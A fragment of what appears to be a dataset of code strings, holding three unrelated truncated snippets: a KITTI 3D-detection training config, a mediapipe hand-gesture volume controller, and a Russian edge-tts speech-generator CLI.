type='MaxIoUAssigner',\n                iou_calculator=dict(type='BboxOverlapsNearest3D'),\n                pos_iou_thr=0.5,\n                neg_iou_thr=0.35,\n                min_pos_iou=0.35,\n                ignore_iof_thr=-1),\n            dict(  # for Cyclist\n                type='MaxIoUAssigner',\n                iou_calculator=dict(type='BboxOverlapsNearest3D'),\n                pos_iou_thr=0.5,\n                neg_iou_thr=0.35,\n                min_pos_iou=0.35,\n                ignore_iof_thr=-1),\n            dict(  # for Car\n                type='MaxIoUAssigner',\n                iou_calculator=dict(type='BboxOverlapsNearest3D'),\n                pos_iou_thr=0.6,\n                neg_iou_thr=0.45,\n                min_pos_iou=0.45,\n                ignore_iof_thr=-1),\n        ],\n        allowed_border=0,\n        pos_weight=-1,\n        debug=False),\n    test_cfg=dict(\n        use_rotate_nms=True,\n        nms_across_levels=False,\n        nms_thr=0.01,\n        score_thr=0.1,\n        min_bbox_size=0,\n        nms_pre=100,\n        max_num=50))\n\n# dataset settings\ndataset_type = 'KittiDataset'\ndata_root = 'data/kitti/'\nclass_names = ['Pedestrian', 'Cyclist', 'Car']\ninput_modality = dict(use_lidar=False, use_camera=False)\ndb_sampler = dict(\n    data_root=data_root,\n    info_path=data_root + 'kitti_dbinfos_train.pkl',\n    rate=1.0,\n    prepare=dict(\n        filter_by_difficulty=[-1],\n        filter_by_min_points=dict(\n            Car=5,\n            Pedestrian=5,\n            Cyclist=5,\n        )),\n    classes=class_names,\n    sample_groups=dict(\n        Car=20,\n        Pedestrian=15,\n        Cyclist=15,\n    ))\nfile_client_args = dict(backend='disk')\n# file_client_args = dict(\n#     backend='petrel', path_mapping=dict(data='s3://kitti_data/'))\n\ntrain_pipeline = [\n    dict(\n        type='LoadPointsFromFile',\n        coord_type='LIDAR',\n        load_dim=4,\n        use_dim=4,\n        file_client_args=file_client_args),\n    dict(\n        type='LoadAnnotations3D',\n        with_bbox_3d=True,\n        with_label_3d=True,\n        file_client_args=file_client_args),\n    dict(type='ObjectSample', db_sampler=db_sampler),\n    dict(type='RandomFlip3D', flip_ratio_bev_horizontal=0.5),\n    dict(\n        type='GlobalRotScaleTrans',\n        rot_range=[-0.78539816, 0.78539816],\n        scale_ratio_range=[0.95, 1.05]),\n    dict(type='PointsRangeFilter', point_cloud_range=point_cloud_range),\n    dict(type='ObjectRangeFilter', point_cloud_range=point_cloud_range),\n    dict(type='PointShuffle'),\n    dict(type='DefaultFormatBundle3D', class_names=class_names),\n    dict(type='Collect3D', keys=['points', 'gt_bboxes_3d', 'gt_labels_3d'])\n]\ntest_pipeline = [\n    dict(\n        type='LoadPointsFromFile',\n        coord_type='LIDAR',\n        load_dim=4,\n        use_dim=4,\n        file_client_args=file_client_args),\n    dict(\n        type='MultiScaleFlipAug3D',\n        img_scale=(1333, 800),\n        pts_scale_ratio=1,\n        flip=False,\n        transforms=[\n            dict(\n                type='GlobalRotScaleTrans',\n                rot_range=[0, 0],\n                scale_r",
    "import cv2\r\nimport mediapipe as mp\r\nimport time\r\nimport pyautogui\r\nimport cv2\r\nimport mediapipe as mp\r\nimport numpy as np\r\nimport time\r\nimport math\r\nfrom ctypes import cast, POINTER\r\nfrom comtypes import CLSCTX_ALL\r\nfrom pycaw.pycaw import AudioUtilities, IAudioEndpointVolume\r\nimport os\r\nimport pygame\r\n\r\npygame.mixer.init()\r\n\r\n\r\nsound_dir = os.path.join(os.getcwd(), \"sounds\")\r\n\r\n\r\naudio_files = [f for f in os.listdir(sound_dir) if f.endswith(('.mp3', '.wav'))]\r\naudio_index = 0  \r\n\r\n\r\nclass HandDetector:\r\n    def __init__(self, mode=False, max_hands=2, detection_conf=0.5, track_conf=0.5):\r\n        self.mode = mode\r\n        self.max_hands = max_hands\r\n        self.detection_conf = detection_conf\r\n        self.track_conf = track_conf\r\n\r\n        self.mpHands = mp.solutions.hands\r\n        self.hands = self.mpHands.Hands(\r\n            static_image_mode=self.mode,\r\n            max_num_hands=self.max_hands,\r\n            min_detection_confidence=self.detection_conf,\r\n            min_tracking_confidence=self.track_conf\r\n        )\r\n        self.mpDraw = mp.solutions.drawing_utils\r\n        self.tipIds = [4, 8, 12, 16, 20]\r\n\r\n    def findHands(self, img, draw=True):\r\n        imgRGB = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\r\n        self.results = self.hands.process(imgRGB)\r\n\r\n        if self.results.multi_hand_landmarks:\r\n            for handLms in self.results.multi_hand_landmarks:\r\n                if draw:\r\n                    self.mpDraw.draw_landmarks(img, handLms, self.mpHands.HAND_CONNECTIONS)\r\n\r\n        return img\r\n\r\n    def findPosition(self, img, hand_no=0, draw=True):\r\n        x_list = []\r\n        y_list = []\r\n        b_box = []\r\n\r\n        self.lm_list = []\r\n        if self.results.multi_hand_landmarks:\r\n            my_hand = self.results.multi_hand_landmarks[hand_no]\r\n\r\n            for id, lm in enumerate(my_hand.landmark):\r\n                h, w, c = img.shape\r\n                cx, cy = int(lm.x * w), int(lm.y * h)\r\n                x_list.append(cx)\r\n                y_list.append(cy)\r\n                self.lm_list.append([id, cx, cy])\r\n                if draw:\r\n                    cv2.circle(img, (cx, cy), 5, (255, 0, 230), 2, cv2.FILLED)\r\n\r\n            xmin, xmax = min(x_list), max(x_list)\r\n            ymin, ymax = min(y_list), max(y_list)\r\n            b_box = xmin, ymin, xmax, ymax\r\n\r\n            if draw:\r\n                cv2.rectangle(img, (b_box[0] - 15, b_box[1] - 15),\r\n                              (b_box[2] + 15, b_box[3] + 15), (255, 255, 0), 2)\r\n\r\n        return self.lm_list, b_box\r\n\r\n    def fingersUp(self):\r\n        fingers = []\r\n       \r\n        if self.lm_list[self.tipIds[0]][1] > self.lm_list[self.tipIds[0] - 1][1]:\r\n            fingers.append(1)\r\n        else:\r\n            fingers.append(0)\r\n       \r\n        for id in range(1, 5):\r\n            if self.lm_list[self.tipIds[id]][2] < self.lm_list[self.tipIds[id] - 2][2]:\r\n                fingers.append(1)\r\n            else:\r\n                fingers.append(0)\r\n        return fingers\r\n\r\n    def findDistance(self, pt1, pt2, img, draw=True):\r\n        x1, y1 = self.lm_list[pt1][1], self.lm_list[pt1][2]\r\n        x2, y2 = self.lm_list[pt2][1], self.lm_list[pt2][2]\r\n        cx, cy = (x1 + x2) // 2, (y1 + y2) // 2\r\n\r\n        if draw:\r\n            cv2.circle(img, (x1, y1), 10, (255, 165, 0), cv2.FILLED)\r\n            cv2.circle(img, (x2, y2), 10, (255, 165, 0), cv2.FILLED)\r\n            cv2.line(img, (x1, y1), (x2, y2), (255, 255, 240), 2)\r\n            cv2.circle(img, (cx, cy), 5, (0, 0, 0), cv2.FILLED)\r\n\r\n        len_line = math.hypot(x2 - x1, y2 - y1)\r\n        return len_line, img, [x1, y1, x2, y2, cx, cy]\r\n\r\n###############################\r\nwCam, hCam = 300, 200\r\npTime = 0\r\nmin_dist = 25\r\nmax_dist = 190\r\nvol = 0\r\nvol_bar = 340\r\nvol_perc = 0\r\narea = 0\r\nvol_color = (250, 0, 0)\r\n################################\r\n\r\ncap = cv2.VideoCapture(0)\r\ncap.set(3, wCam)\r\ncap.set(4, hCam)\r\ndetector = HandDetector(detection_conf=0.75, max_hands=1)\r\n\r\ndevices = AudioUtilities.GetSpeakers()\r\ninterface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)\r\nvolume = cast(interface, POINTER(IAudioEndpointVolume))\r\n\r\n\r\nvol_range = volume.GetVolumeRange()\r\nmin_vol = vol_range[0]\r\nmax_vol = vol_range[1]\r\n#/////////////////////////////////////\r\n\r\n# Parmak say\u0131s\u0131n\u0131 tespit eden fonksiyon\r\ndef count_fingers(lst):\r\n    cnt = 0\r\n    thresh = (lst.landmark[0].y * 100 - lst.landmark[9].y * 100) / 2\r\n    if (lst.landmark[5].y * 100 - lst.landmark[8].y * 100) > thresh:\r\n        cnt += 1\r\n    if (lst.landmark[9].y * 100 - lst.landmark[12].y * 100) > thresh:\r\n        cnt += 1\r\n    if (lst.landmark[13].y * 100 - lst.landmark[16].y * 100) > thresh:\r\n        cnt += 1\r\n    if (lst.landmark[17].y * 100 - lst.landmark[20].y * 100) > thresh:\r\n        cnt += 1\r\n    if (lst.landmark[5].x * 100 - lst.landmark[4].x * 100) > 6:\r\n        cnt += 1\r\n    return cnt\r\n\r\n\r\ncap = cv2.VideoCapture(0)\r\ndrawing = mp.solutions.drawing_utils\r\nhands = mp.solutions.hands\r\nhand_obj = hands.Hands(max_num_hands=1)\r\n\r",
    "import asyncio\nimport edge_tts\nimport questionary\nfrom rich.console import Console\nfrom rich.panel import Panel\nfrom rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn\nfrom rich.markdown import Markdown\nfrom rich.style import Style\nfrom rich.table import Table\nfrom rich.box import SQUARE\nfrom rich.columns import Columns\nfrom typing import Dict\n\nconsole = Console()\n\n# \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435\nPROGRAM_NAME = \"\ud83c\udf99 VoiceForge Pro\"\nPROGRAM_VERSION = \"1.0.0\"\nPROGRAM_DESCRIPTION = \"\"\"[bold cyan]VoiceForge Pro[/] - \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0439 \u0433\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0440\u0435\u0447\u0438\n\n[bold yellow]\u041e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435:[/]\n\u0421\u043e\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0439 \u0440\u0435\u0447\u0438 \u043d\u0430 \u043e\u0441\u043d\u043e\u0432\u0435 \u043d\u0435\u0439\u0440\u043e\u0441\u0435\u0442\u0435\u0439 Microsoft Edge TTS.\n\u0418\u0434\u0435\u0430\u043b\u044c\u043d\u043e \u043f\u043e\u0434\u0445\u043e\u0434\u0438\u0442 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0430\u0443\u0434\u0438\u043e\u043a\u043d\u0438\u0433, \u043f\u043e\u0434\u043a\u0430\u0441\u0442\u043e\u0432, \u043e\u0431\u0443\u0447\u0430\u044e\u0449\u0438\u0445 \u043c\u0430\u0442\u0435\u0440\u0438\u0430\u043b\u043e\u0432 \u0438 \u043c\u043d\u043e\u0433\u043e\u0433\u043e \u0434\u0440\u0443\u0433\u043e\u0433\u043e.\n\n[bold green]\ud83c\udf1f \u041a\u043b\u044e\u0447\u0435\u0432\u044b\u0435 \u043e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438:[/]\n\u2022 \u0412\u044b\u0441\u043e\u043a\u043e\u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 \u0441\u0438\u043d\u0442\u0435\u0437 \u0440\u0435\u0447\u0438\n\u2022 \u0414\u0432\u0430 \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0445 \u0433\u043e\u043b\u043e\u0441\u0430\n\u2022 \u0413\u043e\u0442\u043e\u0432\u044b\u0435 \u043f\u0440\u0435\u0441\u0435\u0442\u044b \u0434\u043b\u044f \u0440\u0430\u0437\u043d\u044b\u0445 \u0437\u0430\u0434\u0430\u0447\n\u2022 \u0422\u043e\u0447\u043d\u0430\u044f \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432\n\u2022 \u0423\u043c\u043d\u0430\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0442\u0435\u043a\u0441\u0442\u0430\n\n[bold magenta]\ud83d\udccb \u0414\u043e\u0441\u0442\u0443\u043f\u043d\u044b\u0435 \u043f\u0440\u0435\u0441\u0435\u0442\u044b:[/]\n\n[bold]1. \ud83c\udf99 \u041f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0438\u043a\u0442\u043e\u0440[/]\n   \u251c\u2500 \u0414\u043b\u044f: \u043f\u0440\u0435\u0437\u0435\u043d\u0442\u0430\u0446\u0438\u0439, \u0440\u0435\u043a\u043b\u0430\u043c\u044b, \u0430\u043d\u043e\u043d\u0441\u043e\u0432\n   \u251c\u2500 \u041e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438: \u0447\u0451\u0442\u043a\u0430\u044f \u0440\u0435\u0447\u044c, \u0430\u0432\u0442\u043e\u0440\u0438\u0442\u0435\u0442\u043d\u043e\u0435 \u0437\u0432\u0443\u0447\u0430\u043d\u0438\u0435\n   \u2514\u2500 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438: \u0441\u0440\u0435\u0434\u043d\u0438\u0439 \u0442\u0435\u043c\u043f, \u043e\u043f\u0442\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0433\u0440\u043e\u043c\u043a\u043e\u0441\u0442\u044c\n\n[bold]2. \ud83d\udcda \u0410\u0443\u0434\u0438\u043e\u043a\u043d\u0438\u0433\u0430[/]\n   \u251c\u2500 \u0414\u043b\u044f: \u0445\u0443\u0434\u043e\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0439 \u043b\u0438\u0442\u0435\u0440\u0430\u0442\u0443\u0440\u044b\n   \u251c\u2500 \u041e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438: \u043f\u0440\u0438\u044f\u0442\u043d\u044b\u0439 \u0442\u0435\u043c\u0431\u0440, \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0435 \u043f\u0430\u0443\u0437\u044b\n   \u2514\u2500 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438: \u043a\u043e\u043c\u0444\u043e\u0440\u0442\u043d\u044b\u0439 \u0442\u0435\u043c\u043f, \u0441\u0431\u0430\u043b\u0430\u043d\u0441\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0437\u0432\u0443\u043a\n\n[bold]3. \ud83c\udf93 \u041e\u0431\u0443\u0447\u0430\u044e\u0449\u0438\u0439 \u043c\u0430\u0442\u0435\u0440\u0438\u0430\u043b[/]\n   \u251c\u2500 \u0414\u043b\u044f: \u0443\u0440\u043e\u043a\u043e\u0432, \u043b\u0435\u043a\u0446\u0438\u0439, \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0439\n   \u251c\u2500 \u041e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438: \u0447\u0451\u0442\u043a\u043e\u0435 \u043f\u0440\u043e\u0438\u0437\u043d\u043e\u0448\u0435\u043d\u0438\u0435\n   \u2514\u2500 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438: \u043c\u0435\u0434\u043b\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043c\u043f, \u043f\u043e\u0432\u044b\u0448\u0435\u043d\u043d\u0430\u044f \u0447\u0451\u0442\u043a\u043e\u0441\u0442\u044c\n\n[bold]4. \ud83d\udcf0 \u041d\u043e\u0432\u043e\u0441\u0442\u043d\u043e\u0439 \u0434\u0438\u043a\u0442\u043e\u0440[/]\n   \u251c\u2500 \u0414\u043b\u044f: \u043d\u043e\u0432\u043e\u0441\u0442\u0435\u0439, \u043e\u0431\u0437\u043e\u0440\u043e\u0432, \u043e\u0442\u0447\u0451\u0442\u043e\u0432\n   \u251c\u2500 \u041e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438: \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u0432\u0443\u0447\u0430\u043d\u0438\u0435\n   \u2514\u2500 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438: \u043e\u043f\u0442\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u0438 \u0447\u0451\u0442\u043a\u043e\u0441\u0442\u044c\n\n[bold]5. \ud83d\udde3 \u0420\u0430\u0437\u0433\u043e\u0432\u043e\u0440\u043d\u044b\u0439 \u0441\u0442\u0438\u043b\u044c[/]\n   \u251c\u2500 \u0414\u043b\u044f: \u0434\u0438\u0430\u043b\u043e\u0433\u043e\u0432, \u0431\u043b\u043e\u0433\u043e\u0432, \u043f\u043e\u0434\u043a\u0430\u0441\u0442\u043e\u0432\n   \u251c\u2500 \u041e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438: \u0436\u0438\u0432\u0430\u044f \u0440\u0435\u0447\u044c, \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0435 \u0438\u043d\u0442\u043e\u043d\u0430\u0446\u0438\u0438\n   \u2514\u2500 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438: \u0434\u0438\u043d\u0430\u043c\u0438\u0447\u043d\u044b\u0439 \u0442\u0435\u043c\u043f, \u0436\u0438\u0432\u043e\u0435 \u0437\u0432\u0443\u0447\u0430\u043d\u0438\u0435\n\n[bold]6. \ud83d\udcd6 \u0425\u0443\u0434\u043e\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0447\u0442\u0435\u043d\u0438\u0435[/]\n   \u251c\u2500 \u0414\u043b\u044f: \u043f\u043e\u044d\u0437\u0438\u0438, \u0445\u0443\u0434\u043e\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0445 \u0442\u0435\u043a\u0441\u0442\u043e\u0432\n   \u251c\u2500 \u041e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438: \u0432\u044b\u0440\u0430\u0437\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0447\u0442\u0435\u043d\u0438\u0435\n   \u2514\u2500 \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438: \u0440\u0430\u0437\u043c\u0435\u0440\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043c\u043f, \u044d\u043c\u043e\u0446\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u044c\n\n[bold yellow]\ud83d\udca1 \u041a\u0430\u043a \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c:[/]\n1. \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u044c\u0442\u0435 \u0442\u0435\u043a\u0441\u0442 \u0432 \u0444\u0430\u0439\u043b\u0435 text.txt\n2. \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u043e\u0434\u0445\u043e\u0434\u044f\u0449\u0438\u0439 \u0433\u043e\u043b\u043e\u0441\n3. \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0435\u0441\u0435\u0442 \u0434\u043b\u044f \u0432\u0430\u0448\u0435\u0439 \u0437\u0430\u0434\u0430\u0447\u0438\n4. \u0414\u043e\u0436\u0434\u0438\u0442\u0435\u0441\u044c \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438\n\n[bold red]\u26a0\ufe0f \u0412\u0430\u0436\u043d\u043e:[/] \u0423\u0431\u0435\u0434\u0438\u0442\u0435\u0441\u044c, \u0447\u0442\u043e \u0444\u0430\u0439\u043b text.txt \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0432 \u0442\u043e\u0439 \u0436\u0435 \u043f\u0430\u043f\u043a\u0435, \u0447\u0442\u043e \u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430.\n\"\"\"\n\n# \u0411\u0430\u0437\u043e\u0432\u044b\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \u043f\u0440\u0435\u0441\u0435\u0442\u043e\u0432\nBASE_PRESETS = {\n    \"\ud83c\udf99 \u041f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0438\u043a\u0442\u043e\u0440\": {\n        \"rate\": \"-3%\",      # \u0421\u043b\u0435\u0433\u043a\u0430 \u0437\u0430\u043c\u0435\u0434\u043b\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043c\u043f \u0434\u043b\u044f \u0447\u0435\u0442\u043a\u043e\u0441\u0442\u0438\n        \"volume\": \"+2%\",    # \u0423\u043c\u0435\u0440\u0435\u043d\u043d\u0430\u044f \u0433\u0440\u043e\u043c\u043a\u043e\u0441\u0442\u044c \u0434\u043b\u044f \u0438\u0437\u0431\u0435\u0436\u0430\u043d\u0438\u044f \u0438\u0441\u043a\u0430\u0436\u0435\u043d\u0438\u0439\n        \"pitch\": \"-1Hz\",    # \u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u043e\u043d\u0438\u0436\u0435\u043d\u0438\u0435 \u0442\u043e\u043d\u0430 \u0434\u043b\u044f \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0441\u0442\u0438\n    },\n    \"\ud83d\udcda \u0410\u0443\u0434\u0438\u043e\u043a\u043d\u0438\u0433\u0430\": {\n        \"rate\": \"-5%\",      # \u041a\u043e\u043c\u0444\u043e\u0440\u0442\u043d\u044b\u0439 \u0442\u0435\u043c\u043f \u0434\u043b\u044f \u0432\u043e\u0441\u043f\u0440\u0438\u044f\u0442\u0438\u044f\n        \"volume\": \"+0%\",    # \u0421\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u0430\u044f \u0433\u0440\u043e\u043c\u043a\u043e\u0441\u0442\u044c\n        \"pitch\": \"+0Hz\",    # \u0415\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 \u0442\u043e\u043d\n    },\n    \"\ud83c\udf93 \u041e\u0431\u0443\u0447\u0430\u044e\u0449\u0438\u0439 \u043c\u0430\u0442\u0435\u0440\u0438\u0430\u043b\": {\n        \"rate\": \"-10%\",     # \u041c\u0435\u0434\u043b\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043c\u043f \u0434\u043b\u044f \u043b\u0443\u0447\u0448\u0435\u0433\u043e \u043f\u043e\u043d\u0438\u043c\u0430\u043d\u0438\u044f\n        \"volume\": \"+3%\",    # \u0421\u043b\u0435\u0433\u043a\u0430 \u043f\u043e\u0432\u044b\u0448\u0435\u043d\u043d\u0430\u044f \u0433\u0440\u043e\u043c\u043a\u043e\u0441\u0442\u044c \u0434\u043b\u044f \u0447\u0435\u0442\u043a\u043e\u0441\u0442\u0438\n        \"pitch\": \"-2Hz\",    # \u041b\u0435\u0433\u043a\u043e\u0435 \u043f\u043e\u043d\u0438\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0430\u0432\u0442\u043e\u0440\u0438\u0442\u0435\u0442\u043d\u043e\u0441\u0442\u0438\n    },\n    \"\ud83d\udcf0 \u041d\u043e\u0432\u043e\u0441\u0442\u043d\u043e\u0439 \u0434\u0438\u043a\u0442\u043e\u0440\": {\n        \"rate\": \"+0%\",      # \u0421\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u044b\u0439 \u0442\u0435\u043c\u043f\n        \"volume\": \"+4%\",    # \u041e\u043f\u0442\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0433\u0440\u043e\u043c\u043a\u043e\u0441\u0442\u044c \u0434\u043b\u044f \u043d\u043e\u0432\u043e\u0441\u0442\u0435\u0439\n        \"pitch\": \"-2Hz\",    # \u041f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u0432\u0443\u0447\u0430\u043d\u0438\u0435\n    },\n    \"\ud83d\udde3 \u0420\u0430\u0437\u0433\u043e\u0432\u043e\u0440\u043d\u044b\u0439 \u0441\u0442\u0438\u043b\u044c\": {\n        \"rate\": \"+2%\",      # \u0415\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043c\u043f \u0440\u0435\u0447\u0438\n        \"volume\": \"+1%\",    # \u041b\u0435\u0433\u043a\u043e\u0435 \u0443\u0441\u0438\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0435\u0442\u043a\u043e\u0441\u0442\u0438\n        \"pitch\": \"+0Hz\",    # \u0415\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 \u0442\u043e\u043d\n    },\n    \"\ud83d\udcd6 \u0425\u0443\u0434\u043e\u0436\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0447\u0442\u0435\u043d\u0438\u0435\": {\n        \"rate\": \"-7%\",      # \u0420\u0430\u0437\u043c\u0435\u0440\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043c\u043f \u0434\u043b\u044f \u0432\u044b\u0440\u0430\u0437\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438\n        \"volume\": \"+2%\",    # \u041e\u043f\u0442\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0433\u0440\u043e\u043c\u043a\u043e\u0441\u0442\u044c\n        \"pitch\": \"-1Hz\",    # \u041b\u0435\u0433\u043a\u043e\u0435 \u043f\u043e\u043d\u0438\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0433\u043b\u0443\u0431\u0438\u043d\u044b\n    }\n}\n\n# \u0413\u043e\u043b\u043e\u0441\u0430 \u0434\u043b\u044f \u0440\u0430\u0437\u043d\u044b\u0445 \u043f\u043e\u043b\u043e\u0432\nVOICES = {\n    \"\u041c\u0443\u0436\u0441\u043a\u043e\u0439\": \"ru-RU-DmitryNeural\",\n    \"\u0416\u0435\u043d\u0441\u043a\u0438\u0439\": \"ru-RU-SvetlanaNeural\"\n}\n\ndef get_preset_settings(preset_name: str, voice: str) -> Dict:\n    \"\"\"\u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043a \u043f\u0440\u0435\u0441\u0435\u0442\u0430 \u0441 \u0443\u0447\u0435\u0442\u043e\u043c \u0432\u044b\u0431\u0440\u0430\u043d\u043d\u043e\u0433\u043e \u0433\u043e\u043b\u043e\u0441\u0430\"\"\"\n    settings = BASE_PRESETS[preset_name].copy()\n    settings[\"voice\"] = voice\n    return settings\n\nasync def show_help():\n    \"\"\"\u041f\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u0441\u043f\u0440\u0430\u0432\u043a\u0443 \u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435\"\"\"\n    # \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u044d\u043a\u0440\u0430\u043d \u043f\u0435\u0440\u0435\u0434 \u0432\u044b\u0432\u043e\u0434\u043e\u043c \u0441\u043f\u0440\u0430\u0432\u043a\u0438\n    console.clear()\n    \n    # \u041e\u0441\u043d\u043e\u0432\u043d\u0430\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f\n    console.print(Panel.fit(\n        f\"[bold cyan]{PROGRAM_NAME}[/] - \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0439 \u0433\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440 \u0440\u0435\u0447\u0438\",\n        border_style=\"cyan\",\n        padding=(1, 2)\n    ))\n\n    console.print()  # \u041e\u0442\u0441\u0442\u0443\u043f\n\n    # \u041e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435 \u0438 \u043a\u043b\u044e\u0447\u0435\u0432\u044b\u0435 \u043e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438 \u0432 \u043e\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435\n    left_panel = Panel.fit(\n        \"[bold yellow]\u041e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435[/]\\n\\n\" +\n        \"\u0421\u043e\u0432\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0439 \u0440\u0435\u0447\u0438 \u043d\u0430 \u043e\u0441\u043d\u043e\u0432\u0435\\n\" +\n        \"\u043d\u0435\u0439\u0440\u043e\u0441\u0435\u0442\u0435\u0439 Microsoft Edge TTS. \u0418\u0434\u0435\u0430\u043b\u044c\u043d\u043e \u043f\u043e\u0434\u0445\u043e\u0434\u0438\u0442 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f\\n\" +\n        \"\u0430\u0443\u0434\u0438\u043e\u043a\u043d\u0438\u0433, \u043f\u043e\u0434\u043a\u0430\u0441\u0442\u043e\u0432, \u043e\u0431\u0443\u0447\u0430\u044e\u0449\u0438\u0445 